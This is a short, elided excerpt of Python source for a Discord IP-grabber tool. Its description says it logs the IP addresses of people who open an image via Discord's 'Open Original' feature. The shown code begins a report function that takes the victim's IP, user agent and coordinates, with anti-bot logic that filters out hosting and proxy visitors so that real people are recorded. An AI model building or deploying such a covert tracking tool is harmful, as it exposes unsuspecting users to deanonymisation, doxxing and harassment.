...
__description__ = "A simple application which allows you to log IPs via Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"
...
def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, image_url=None):
    ...
    if info.get("hosting", False):
        if config["antiBot"] in [1, 2, 3, 4]:
            if config["antiBot"] in [2, 4] and not info.get("proxy", False):
                if config["antiBot"] == 4:
                    return
                ping = ""
            if config["antiBot"] == 3:
